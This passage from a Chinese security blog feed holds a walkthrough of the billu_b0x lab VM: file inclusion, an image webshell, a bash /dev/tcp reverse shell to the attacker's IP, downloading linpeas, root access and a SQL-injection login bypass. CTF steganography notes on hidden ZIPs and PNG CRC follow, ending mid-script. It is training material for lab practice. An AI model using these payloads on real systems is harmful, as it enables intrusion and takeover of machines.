class="built_in">dir</span>.&#x27;/&#x27;.$_POST[&#x27;load&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点是第20行</p><p>如果有地方可以写一句话，那可以用这个页面来包含一句话的文件，这样就会执行一句话的内容。</p><p>在文件 c.php 中发现了数据库的登录账号和密码</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127153650769.png" alt="image-20231127153650769"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;billu&quot;</span>,<span class="string">&quot;b0x_billu&quot;</span>,<span class="string">&quot;ica_lab&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="利用获取到的账号密码登录数据库管理界面"><a href="#利用获取到的账号密码登录数据库管理界面" class="headerlink" title="利用获取到的账号密码登录数据库管理界面"></a>利用获取到的账号密码登录数据库管理界面</h2><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127154121627.png" alt="image-20231127154121627"></p><p>翻了翻数据库，发现了一个有趣的信息（密码居然是明文存储。。。。。）</p><blockquote><p>biLLu hEx_it</p></blockquote><p>回到刚刚的sql注入界面，尝试登录</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127131705032.png"></p><p>发现登录成功</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127154603937.png" alt="image-20231127154603937"></p><p>登录后是一个上传文件的界面，发现只能传格式为图片的文件。</p><p>注： 刚刚发现panel.php这个页面存在文件包含漏洞。</p><p>那么可以上传图片马，再借助panel这个页面包含图片马，执行内容（发现panel就是这个页面。。。。）</p><h3 id="上传图片"><a href="#上传图片" class="headerlink" title="上传图片"></a>上传图片</h3><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127163324919.png" alt="image-20231127163324919"></p><p>我自己上传了两张图，一张测试用，一张是图片马</p><p>先查看图片的路径（右键图片，在新标签页中打开）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://192.168.31.180/<span class="title">uploaded_images</span>/<span class="title">muma.jpg</span></span></span><br></pre></td></tr></table></figure><p>然后借助文件包含漏洞，包含图片马，传入ls命令测试</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127180423605.png" alt="image-20231127180423605"></p><p>可以看到 ls 命令成功执行了</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>本地开启nc监听</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">4444</span></span><br></pre></td></tr></table></figure><p>借助图片马运行以下命令 反弹shell</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> &quot;bash -i &amp;&gt; /dev/tcp/<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">19</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>&quot; | bash</span><br></pre></td></tr></table></figure><p>并且需要把这一段编码，防止在传输过程中被意外截断</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127182900570.png" alt="image-20231127182900570"></p><p>运行，成功getshell</p><blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# nc -lvnp <span class="number">4444</span>                                             </span><br><span class="line">listening on [any] <span class="number">4444</span> ...</span><br><span class="line">connect to [<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">19</span>] from (UNKNOWN) [<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span>] <span class="number">46328</span></span><br><span class="line"><span class="function">bash: <span class="title">no</span> <span class="title">job</span> <span class="title">control</span> <span class="title">in</span> <span class="title">this</span> <span class="title">shell</span></span></span><br><span class="line"><span class="function"><span class="title">www</span>-<span class="title">data</span>@<span class="title">indishell</span>:/<span class="title">var</span>/<span class="title">www</span>$ <span class="title">echo</span> $<span class="title">SHELL</span></span></span><br><span class="line"><span class="function"><span class="title">echo</span> $<span class="title">SHELL</span></span></span><br><span class="line"><span class="function">/<span class="title">bin</span>/<span class="title">sh</span></span></span><br></pre></td></tr></table></figure></blockquote><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="常规信息收集"><a href="#常规信息收集" class="headerlink" title="常规信息收集"></a>常规信息收集</h3><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">www-data@indishell:/var/www$ whoami </span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@indishell:/var/www$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux</span><br><span class="line">www-data@indishell:/var/www$ ls</span><br><span class="line">ls</span><br><span class="line">add.php</span><br><span class="line">c.php</span><br><span class="line">head.php</span><br><span class="line">head2.php</span><br><span class="line">images</span><br><span class="line">in.php</span><br><span class="line">index.php</span><br><span class="line">panel.php</span><br><span class="line">phpmy</span><br><span class="line">show.php</span><br><span class="line">test.php</span><br><span class="line">uploaded_images</span><br><span class="line">www-data@indishell:/var/www$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br><span class="line">Sorry, try again.</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br><span class="line">Sorry, try again.</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br><span class="line">Sorry, try again.</span><br><span class="line">sudo: 3 incorrect password attempts</span><br></pre></td></tr></table></figure><p>查看可写的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@indishell:/var/www$ find / -writable -type f ! -path &#x27;/proc/*&#x27; 2&gt;/dev/null</span><br><span class="line">&lt;$ find / -writable -type f ! -path &#x27;/proc/*&#x27; 2&gt;/dev/null                    </span><br><span class="line">/var/www/uploaded_images/muma.jpg</span><br><span class="line">/var/www/uploaded_images/muma2.jpg</span><br><span class="line">/sys/kernel/security/apparmor/.access</span><br><span class="line">www-data@indishell:/var/www$</span><br></pre></td></tr></table></figure><p>全部看了一遍，没有什么有价值的信息</p></blockquote><h3 id="上传linpeas-sh"><a href="#上传linpeas-sh" class="headerlink" title="上传linpeas.sh"></a>上传linpeas.sh</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br></pre></td></tr></table></figure><p>本地开启php服务器</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127184212633.png" alt="image-20231127184212633"></p><p>操控靶机下载linpeas.sh并运行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">19</span>/linpeas.sh</span><br><span class="line">chmod +x ./linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127223708950.png" alt="image-20231127223708950"></p><h3 id="！！！查看敏感信息提权"><a href="#！！！查看敏感信息提权" class="headerlink" title="！！！查看敏感信息提权"></a>！！！查看敏感信息提权</h3><p>linpeas扫描出的一些有趣的结果</p><blockquote><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127185454326.png" alt="image-20231127185454326"></p><p>这里提示了有个password是roottoor</p><p>把这个文件下载下来看看，发现直勾勾地写着user=root，password=roottoor</p><p>。。。。。。</p><p>实测root就是这个密码</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿lkk)-[/home/lkk]</span><br><span class="line">└─# ssh root@<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span></span><br><span class="line">The authenticity of host &#x27;<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span> (<span class="number">192</span>.<span class="number">168</span>.<span class="number">31</span>.<span class="number">180</span>)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:UyLCTuDmpoRJdivxmtTOMWDk0apVt5NWjp8Xno1e+Z4.</span><br><span class="line">This host key is known by the following other names/addresses:</span><br><span class="line">    ~/.ssh/known_hosts:<span class="number">1</span>: [hashed name]</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? y</span><br><span class="line">Please <span class="built_in">type</span> &#x27;yes&#x27;, &#x27;no&#x27; or the fingerprint: yes</span><br><span class="line"><span class="function">Warning: <span class="title">Permanently</span> <span class="title">added</span> &#x27;192.168.31.180&#x27; (<span class="title">ECDSA</span>) <span class="title">to</span> <span class="title">the</span> <span class="title">list</span> <span class="title">of</span> <span class="title">known</span> <span class="title">hosts</span>.</span></span><br><span class="line"><span class="function"><span class="title">root</span>@192.168.31.180&#x27;<span class="title">s</span> <span class="title">password</span>: </span></span><br><span class="line"><span class="function"><span class="title">Welcome</span> <span class="title">to</span> <span class="title">Ubuntu</span> 12.04.5 <span class="title">LTS</span> (<span class="title">GNU</span>/<span class="title">Linux</span> 3.13.0-32-<span class="title">generic</span> <span class="title">i686</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> * <span class="title">Documentation</span>:  <span class="title">https</span>://<span class="title">help.ubuntu.com</span>/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">System</span> <span class="title">information</span> <span class="title">as</span> <span class="title">of</span> <span class="title">Mon</span> <span class="title">Nov</span> 27 16:35:59 <span class="title">IST</span> 2023</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">System</span> <span class="title">load</span>:  0.25              <span class="title">Processes</span>:           111</span></span><br><span class="line"><span class="function">  <span class="title">Usage</span> <span class="title">of</span> /:   13.4% <span class="title">of</span> 9.61<span class="title">GB</span>   <span class="title">Users</span> <span class="title">logged</span> <span class="title">in</span>:     0</span></span><br><span class="line"><span class="function">  <span class="title">Memory</span> <span class="title">usage</span>: 22%               <span class="title">IP</span> <span class="title">address</span> <span class="title">for</span> <span class="title">eth0</span>: 192.168.31.180</span></span><br><span class="line"><span class="function">  <span class="title">Swap</span> <span class="title">usage</span>:   0%</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">Graph</span> <span class="title">this</span> <span class="title">data</span> <span class="title">and</span> <span class="title">manage</span> <span class="title">this</span> <span class="title">system</span> <span class="title">at</span>:</span></span><br><span class="line"><span class="function">    <span class="title">https</span>://<span class="title">landscape.canonical.com</span>/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">New</span> <span class="title">release</span> &#x27;14.04.5 <span class="title">LTS</span>&#x27; <span class="title">available</span>.</span></span><br><span class="line"><span class="function"><span class="title">Run</span> &#x27;<span class="title">do</span>-<span class="title">release</span>-<span class="title">upgrade</span>&#x27; <span class="title">to</span> <span class="title">upgrade</span> <span class="title">to</span> <span class="title">it</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Your</span> <span class="title">Hardware</span> <span class="title">Enablement</span> <span class="title">Stack</span> (<span class="title">HWE</span>) <span class="title">is</span> <span class="title">supported</span> <span class="title">until</span> <span class="title">April</span> 2017.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Last</span> <span class="title">login</span>: <span class="title">Sun</span> <span class="title">Nov</span> 26 20:01:11 2023</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">indishell</span>:~#</span></span><br></pre></td></tr></table></figure><p>特殊情况有特殊情况的捷径</p><p>提权成功！</p></blockquote><h3 id="常规提权思路："><a href="#常规提权思路：" class="headerlink" title="常规提权思路："></a>常规提权思路：</h3><p>根据llinpeas的扫描结果，尝试可能性高的提权脚本</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127223612901.png" alt="image-20231127223612901"></p><p>最终使用 37292.c 成功提权</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127224700972.png" alt="image-20231127224700972"></p><h2 id="打完复盘：sql注入-新的渗透思路"><a href="#打完复盘：sql注入-新的渗透思路" class="headerlink" title="打完复盘：sql注入 新的渗透思路"></a>打完复盘：sql注入 新的渗透思路</h2><p>在主页这个可能存在sql注入的地方，通过查看源码，发现过滤规则如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line"><span class="variable">$run</span>=<span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$run</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;You are allowed&lt;br&gt;&quot;</span>;</span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]=<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">   </span><br><span class="line"> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: panel.php&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Try again&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第3行和第4行把 单引号 过滤掉了</p><p>注意到sql语句这部分存在一个漏洞：</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$run</span> = <span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>也就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> auth <span class="keyword">where</span>  pass<span class="operator">=</span><span class="string">&#x27;.$pass.&#x27;</span> <span class="keyword">and</span> uname<span class="operator">=</span><span class="string">&#x27;.$uname.&#x27;</span></span><br></pre></td></tr></table></figure><p>虽然 ‘ 被过滤了，但是可以通过 \ 转义导致单引号的匹配出问题</p><p>设置 $pass 为 \</p><p>设置 $uname 为 or 1=1 # xxxx</p><p>那么这句sql就变成了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> auth <span class="keyword">where</span>  pass<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> uname<span class="operator">=</span><span class="string">&#x27;or 1=1 # xxxx&#x27;</span></span><br></pre></td></tr></table></figure><p>就会导致这句的执行结果为true，最终导致账号密码认证通过</p></blockquote><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127234157890.png" alt="image-20231127234157890"></p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231127234212997.png" alt="image-20231127234212997"></p><p>成功登录到此页面（又复习了一次sql注入绕过寄巧）</p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
            <tag> bilLu </tag>
            
            <tag> sql </tag>
            
            <tag> 图片马 </tag>
            
            <tag> linpeas </tag>
            
            <tag> 内核漏洞提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jpg图片隐藏压缩包</title>
      <link href="/2023/11/19/CTF/jpg%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
      <url>/2023/11/19/CTF/jpg%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="jpg图片隐藏压缩包"><a href="#jpg图片隐藏压缩包" class="headerlink" title="jpg图片隐藏压缩包"></a>jpg图片隐藏压缩包</h1><h2 id="辨别"><a href="#辨别" class="headerlink" title="辨别"></a>辨别</h2><p>在图片里隐藏一个压缩包是一种常用的隐写术</p><p>可以使用010Editor打开图片，查看文件头部和尾部，查看是否有其他文件的文件头标识。</p><p>以“bugku 啊哒”这道题为例，使用 010Editor 打开图片后，在结尾看到了压缩包的文件头标识 </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">05 4B 03 04</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231119125219257.png" alt="image-20231119125219257"></p><h2 id="分离文件并提取"><a href="#分离文件并提取" class="headerlink" title="分离文件并提取"></a>分离文件并提取</h2><p>可以使用 kali 下的binwalk分离出文件。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e ada.jpg --run-as=root</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231119130558606.png" alt="image-20231119130558606"></p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231119130651440.png" alt="image-20231119130651440"></p><h2 id="拓展-常见的文件头和结尾"><a href="#拓展-常见的文件头和结尾" class="headerlink" title="拓展 常见的文件头和结尾"></a>拓展 常见的文件头和结尾</h2><blockquote><p>以下是一些常见文件的文件头（File Signature）和文件尾标识（File Footer Signature）的示例：</p><ol><li><strong>JPEG 图像 (.jpg, .jpeg):</strong><ul><li>文件头：<code>FF D8 FF E0</code></li><li>文件尾标识：<code>FF D9</code></li></ul></li><li><strong>PNG 图像 (.png):</strong><ul><li>文件头：<code>89 50 4E 47 0D 0A 1A 0A</code></li><li>文件尾标识：<code>IEND</code>（以ASCII形式存在）</li></ul></li><li><strong>ZIP 文件 (.zip):</strong><ul><li>文件头：<code>50 4B 03 04</code></li><li>文件尾标识：<code>50 4B 05 06</code>（结束记录的标识）</li></ul></li><li><strong>PDF 文档 (.pdf):</strong><ul><li>文件头：<code>25 50 44 46 2D</code></li><li>文件尾标识：<code>25 25 45 4F 46</code>（以ASCII形式存在）</li></ul></li><li><strong>GIF 图像 (.gif):</strong><ul><li>文件头：<code>47 49 46 38 39 61</code></li><li>文件尾标识：<code>00 3B</code></li></ul></li><li><strong>MP3 音频 (.mp3):</strong><ul><li>文件头：<code>FF FB</code></li><li>文件尾标识：可变，通常没有固定的标识</li></ul></li><li><strong>Microsoft Word 文档 (.docx):</strong><ul><li>文件头：<code>50 4B 03 04</code></li><li>文件尾标识：<code>50 4B 05 06</code>（结束记录的标识）</li></ul></li><li><strong>Microsoft Excel 电子表格 (.xlsx):</strong><ul><li>文件头：<code>50 4B 03 04</code></li><li>文件尾标识：<code>50 4B 05 06</code>（结束记录的标识）</li></ul></li><li><strong>Windows 可执行文件 (.exe):</strong><ul><li>文件头：<code>4D 5A</code></li><li>文件尾标识：没有固定的标识，通常没有特定的结尾标志。</li></ul></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 隐写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>png文件CRC校验</title>
      <link href="/2023/11/19/CTF/png%E6%96%87%E4%BB%B6crc%E6%A0%A1%E9%AA%8C/"/>
      <url>/2023/11/19/CTF/png%E6%96%87%E4%BB%B6crc%E6%A0%A1%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="png文件的CRC校验"><a href="#png文件的CRC校验" class="headerlink" title="png文件的CRC校验"></a>png文件的CRC校验</h1><h2 id="png图片的CRC校验"><a href="#png图片的CRC校验" class="headerlink" title="png图片的CRC校验"></a>png图片的CRC校验</h2><h3 id="png的格式"><a href="#png的格式" class="headerlink" title="png的格式"></a>png的格式</h3><p>png文件中分为很多个<strong>chunk</strong>（数据的基本组成单元）</p><p>以下是一些常见的chunk</p><ul><li>IHDR<strong>（Image Header）</strong>：包含图像的基本信息，如宽度、高度、颜色深度等。</li><li>IDAT<strong>（Image Data）</strong>：包含图像的实际像素数据。由于 PNG 使用 DEFLATE 压缩算法，实际的图像数据被包含在一个或多个 IDAT 块中。</li><li>PLTE<strong>（Palette）</strong>：如果图像使用调色板，此块包含调色板中的颜色信息。</li><li>tEXt<strong>（Textual Data）</strong>：包含关于图像的文本信息，如作者、标题等。</li><li>tIME<strong>（Time Stamp）</strong>： 包含图像的最后修改时间。</li></ul><h3 id="每个chunk的格式"><a href="#每个chunk的格式" class="headerlink" title="每个chunk的格式"></a>每个chunk的格式</h3><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>以一个png文件的chunk[0]为例（蓝色部分）：</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231119003131899.png" alt="image-20231119003131899"></p><ul><li><p>前四个字节 00 00 00 0D 代表这个chunk的<strong>数据块</strong>的长度是13（0D十进制表示）。</p></li><li><p>随后的 49 48 44 52 是“IHDR”的ascii码表示（见图右），是固定的格式。</p></li><li><p>紧跟着的就是数据块 00 00 01 F4 00 00 01 A4 08 06 00 00 00</p><ul><li>前四个字节代表图片的宽（00 00 01 F4）</li><li>紧跟着的四个字节是高（00 00 01 A4）</li><li>剩下的五个字节分别指定了整个图片的<ul><li>颜色通道的位深度</li><li>颜色类型</li><li>压缩方法</li><li>过滤方法</li><li>交错方法</li></ul></li></ul></li><li><p>紧跟在数据块后面的四个字节是CRC校验码（CB D6 DF 8A)</p></li></ul><p>所以这个chunk[0]的格式就是这样的：</p><blockquote><p>chunk中数据块的长度（4字节）+IHDR固定标识（4字节）+数据块（长度前面指定）+CRC校验码（4字节）</p></blockquote><h3 id="CRC循环冗余校验码"><a href="#CRC循环冗余校验码" class="headerlink" title="CRC循环冗余校验码"></a>CRC循环冗余校验码</h3><p>PNG 文件中的每个 chunk 都包含一个 CRC（循环冗余校验）校验码，用于确保 chunk 的数据在传输或存储过程中没有被损坏或篡改。</p><p>这里的CRC 校验码是通过将 chunk 的数据（不包括长度字段和标识符）进行 <strong>CRC32</strong> 算法计算而生成的。计算得到的 CRC 值被附加到 chunk 数据的末尾。</p><h4 id="判断图片格式是否被篡改的关键就是这个CRC校验码"><a href="#判断图片格式是否被篡改的关键就是这个CRC校验码" class="headerlink" title="判断图片格式是否被篡改的关键就是这个CRC校验码"></a>判断图片格式是否被篡改的关键就是这个CRC校验码</h4><p>在解析 PNG 图像时，读取器会验证每个 chunk 的 CRC 校验码，以确保数据的完整性。</p><p>以010Editor这个软件为例，打开png文件时校验码如果出错，那么就会报错</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231119005535792.png" alt="image-20231119005535792"></p><p>（图片提示chunk校验码有问题）</p><blockquote><p>知识点：</p><p>windows系统打开png时，即使CRC校验结果是错的，也会默认忽略这个结果，打开图片。</p><p>而linux系统如果遇到CRC校验结果错误，那么是打不开png的。</p></blockquote><h2 id="拓展：改变图片长和宽的隐写"><a href="#拓展：改变图片长和宽的隐写" class="headerlink" title="拓展：改变图片长和宽的隐写"></a>拓展：改变图片长和宽的隐写</h2><p>有些ctf题目会通过改变图片的宽和高来隐藏信息，需要使用编辑器修改回原来的宽和高格式才能看见内容。</p><p>png图片的长和宽由chunk[0]指定</p><p>chunk[0]的数据数据块的前八个字节就是宽（4字节）高（4字节）</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231119003131899.png" alt="image-20231119003131899"></p><p>在上图里 “001h” 行的0~7列中，前后4个字节就分别对应宽和高（16进制形式）。</p><p>通过修改数据块的宽、高部分，可以使图片显示出隐藏起来的内容。</p><h3 id="借助CRC校验码暴力破解-还原图片原来的长宽格式"><a href="#借助CRC校验码暴力破解-还原图片原来的长宽格式" class="headerlink" title="借助CRC校验码暴力破解 还原图片原来的长宽格式"></a>借助CRC校验码暴力破解 还原图片原来的长宽格式</h3><p>思路：使用CRC32算法去算不同长宽组合的CRC校验码，去碰撞原来的CRC校验码</p><p>这里有一个大佬写的脚本，可以爆破图片原来的高（前提是长未被修改）：</p><p>原链接：<a href="https://www.mondayice.com/2019/12/24/ctf%E9%9A%90%E5%86%99png%E4%B8%ADcrc%E6%A3%80%E9%AA%8C%E9%94%99%E8%AF%AF%E7%9A%84%E5%88%86%E6%9E%90/">https://www.mondayice.com/2019/12/24/ctf%E9%9A%90%E5%86%99png%E4%B8%ADcrc%E6%A3%80%E9%AA%8C%E9%94%99%E8%AF%AF%E7%9A%84%E5%88%86%E6%9E%90/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 